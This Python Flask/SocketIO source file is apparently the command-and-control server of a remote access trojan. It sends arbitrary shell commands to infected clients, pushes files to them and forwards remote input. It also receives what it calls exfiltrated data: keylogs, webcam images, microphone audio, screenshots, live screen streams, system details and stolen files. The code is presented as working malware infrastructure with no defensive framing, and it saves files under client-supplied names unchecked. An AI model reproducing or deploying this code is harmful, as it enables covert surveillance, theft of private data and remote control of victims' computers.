# Standard Library Imports
import os
import json
import time
from datetime import datetime
import base64

# Third-Party Imports
from flask import Flask, request, jsonify, render_template, session, redirect, url_for
from flask_socketio import SocketIO, emit
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

# Initialize Flask app and SocketIO with CORS support
app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', os.urandom(24).hex())  # Fallback to random key if not set
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['DOWNLOAD_FOLDER'] = 'downloads'
socketio = SocketIO(app, cors_allowed_origins="*")

# Load authentication credentials from environment variables
AUTH_USERNAME = os.getenv('AUTH_USERNAME')
AUTH_PASSWORD = os.getenv('AUTH_PASSWORD')

if not AUTH_USERNAME or not AUTH_PASSWORD:
    raise ValueError("AUTH_USERNAME and AUTH_PASSWORD must be set in .env file")

# Global dictionaries to store client data
client_info = {}
client_activity = {}

# --- Routes ---
@app.route('/')
def index():
    """Render the main dashboard if the user is logged in, otherwise redirect to login."""
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    # Prepare initial client list for the template
    client_list = [
        {
            'id': cid,
            'system': info,
            'activity': client_activity.get(cid, {'status': 'idle'})
        }
        for cid, info in client_info.items()
    ]
    return render_template('index.html', clients=client_list)

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Handle user login with username and password from environment variables."""
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username == AUTH_USERNAME and password == AUTH_PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('index'))
        return render_template('login.html', error='Invalid credentials')
    return render_template('login.html')

@app.route('/logout')
def logout():
    """Log out the user by clearing the session and redirect to login."""
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/send_command', methods=['POST'])
def send_command():
    """Send a command to a specific client if the user is authenticated."""
    if not session.get('logged_in'):
        return jsonify({'status': 'error', 'message': 'Unauthorized'}), 403

    client_id = request.form.get('client_id')
    command = request.form.get('command')

    if client_id and command:
        socketio.emit('command', command, to=client_id, namespace='/client')
        return jsonify({'status': 'success'})
    return jsonify({'status': 'error', 'message': 'Invalid request'}), 400

@app.route('/upload', methods=['POST'])
def upload_file():
    """Handle file uploads and notify clients if the user is authenticated."""
    if not session.get('logged_in'):
        return jsonify({'status': 'error', 'message': 'Unauthorized'}), 403

    if 'file' not in request.files:
        return jsonify({'status': 'error', 'message': 'No file part'}), 400

    file = request.files['file']
    if file.filename == '':
        return jsonify({'status': 'error', 'message': 'No selected file'}), 400

    if file:
        filename = file.filename
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(filepath)
        socketio.emit('command', f'upload {filename}', broadcast=True, namespace='/client')
        return jsonify({'status': 'success'})
    return jsonify({'status': 'error', 'message': 'Upload failed'}), 400

# --- SocketIO Event Handlers for Client Namespace ---
@socketio.on('connect', namespace='/client')
def handle_client_connect():
    """Handle new client connections in the /client namespace."""
    print(f"[*] Client connected: {request.sid} on /client namespace")
    client_activity[request.sid] = {"last_active": time.time(), "status": "active"}
    # Update frontend with new client list
    broadcast_client_info()

@socketio.on('disconnect', namespace='/client')
def handle_client_disconnect():
    """Handle client disconnections in the /client namespace."""
    print(f"[*] Client disconnected: {request.sid} from /client namespace")
    if request.sid in client_info:
        del client_info[request.sid]
    if request.sid in client_activity:
        del client_activity[request.sid]
    broadcast_client_info()

@socketio.on('command', namespace='/client')
def handle_client_command(data):
    """Forward commands to specific clients in the /client namespace."""
    if not session.get('logged_in'):
        return  # Only frontend users can send commands
    client_id = request.sid
    command = data.get('to', data)

    if isinstance(command, dict):
        target_client = command.get('to')
        if target_client:
            socketio.emit('command', command.get('command', ''), to=target_client, namespace='/client')
    else:
        socketio.emit('command', command, to=client_id, namespace='/client')

@socketio.on('exfil_data', namespace='/client')
def handle_exfil_data(data):
    """Handle exfiltrated data from clients in the /client namespace."""
    client_id = request.sid
    data = json.loads(data)
    data_type = data.get('type')

    # Update client activity status
    client_activity[client_id]["last_active"] = time.time()
    current_time = time.time()
    for cid, activity in client_activity.items():
        activity["status"] = "idle" if current_time - activity["last_active"] > 30 else "active"

    # Process different types of exfiltrated data
    if data_type == "system_info":
        username = data.get('system', {}).get('username')
        if not username:
            socketio.emit('command', 'whoami', to=client_id, namespace='/client')
        else:
            client_info[client_id] = {
                "system": data.get('system', {}),
                "hardware": data.get('hardware', {}),
                "network": data.get('network', {}),
                "user": data.get('user', {}),
                "software": data.get('software', {}),
                "environment": data.get('environment', {}),
                "peripherals": data.get('peripherals', {}),
                "security": data.get('security', {})
            }
            client_info[client_id]['username'] = username
            client_info[client_id]['ip_addresses'] = data.get('network', {}).get('ip_addresses', [])
            client_info[client_id]['location'] = data.get('network', {}).get('location', 'Unknown')

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{client_id}_{timestamp}_sysinfo.json"
            filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=4)
            print(f"[*] Exfiltrated data saved: {filepath}")

    elif data_type == "command_output":
        command = data.get('command', 'unknown')
        output = data.get('output', '')
        current_dir = data.get('current_dir', 'unknown')

        if command.strip().lower() == 'whoami':
            username = output.strip()
            if client_id not in client_info:
                client_info[client_id] = {}
            client_info[client_id]['username'] = username

        socketio.emit('command_output', {
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'client_id': client_id,
            'command': command,
            'output': output,
            'current_dir': current_dir
        }, broadcast=True, namespace='/')  # Emit to frontend in default namespace

    elif data_type == "network_data":
        socketio.emit('network_data', {
            'client_id': client_id,
            'timestamp': data.get('timestamp'),
            'bytes_sent': data.get('bytes_sent'),
            'bytes_recv': data.get('bytes_recv'),
            'sent_speed_mbps': data.get('sent_speed_mbps'),
            'recv_speed_mbps': data.get('recv_speed_mbps')
        }, broadcast=True, namespace='/')

    elif data_type == "system_data":
        socketio.emit('system_data', {
            'client_id': client_id,
            'timestamp': data.get('timestamp'),
            'cpu_usage_percent': data.get('cpu_usage_percent'),
            'memory_usage_mb': data.get('memory_usage_mb')
        }, broadcast=True, namespace='/')

    elif data_type == "webcam_data":
        socketio.emit('webcam_data', {
            'client_id': client_id,
            'image': data.get('image')
        }, broadcast=True, namespace='/')

    elif data_type == "mic_data":
        socketio.emit('mic_data', {
            'client_id': client_id,
            'audio': data.get('audio')
        }, broadcast=True, namespace='/')

    elif data_type == "screenshot_data":
        socketio.emit('screenshot_data', {
            'client_id': client_id,
            'image': data.get('image')
        }, broadcast=True, namespace='/')

    elif data_type == "screen_stream":
        socketio.emit('screen_stream', {
            'client_id': client_id,
            'image': data.get('image')
        }, broadcast=True, namespace='/')

    elif data_type == "keylog_data":
        socketio.emit('keylog_data', {
            'client_id': client_id,
            'logs': data.get('logs')
        }, broadcast=True, namespace='/')

    elif data_type == "file_download":
        filename = data.get('filename')
        file_data = base64.b64decode(data.get('data'))
        filepath = os.path.join(app.config['DOWNLOAD_FOLDER'], filename)
        with open(filepath, 'wb') as f:
            f.write(file_data)
        print(f"[*] Received file {filename} from client {client_id}")

    # Update client info list and broadcast to all connected frontends
    broadcast_client_info()

def broadcast_client_info():
    """Broadcast updated client info to all frontends in the default namespace."""
    client_info_list = [
        {
            'id': cid,
            'system': info,
            'activity': client_activity.get(cid, {'status': 'idle'})
        }
        for cid, info in client_info.items()
    ]
    socketio.emit('client_info', client_info_list, broadcast=True, namespace='/')

# --- SocketIO Event Handlers for Default Namespace (Frontend) ---
@socketio.on('connect', namespace='/')
def handle_frontend_connect():
    """Handle frontend connections in the default namespace."""
    print(f"[*] Frontend connected: {request.sid} on default namespace")
    broadcast_client_info()

@socketio.on('request_client_info', namespace='/')
def handle_request_client_info():
    """Handle frontend requests for client info."""
    broadcast_client_info()

@socketio.on('remote_input', namespace='/')
def handle_remote_input(data):
    """Forward remote input commands to the specified client."""
    client_id = data.get('client_id')
    input_data = json.loads(data.get('input_data'))
    if client_id:
        socketio.emit('remote_input', input_data, to=client_id, namespace='/client')

# --- Main Entry Point ---
if __name__ == '__main__':
    # Ensure upload and download directories exist
    os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
    os.makedirs(app.config['DOWNLOAD_FOLDER'], exist_ok=True)
    # Run the server
    socketio.run(app, host='0.0.0.0', port=5000, debug=True, allow_unsafe_werkzeug=True)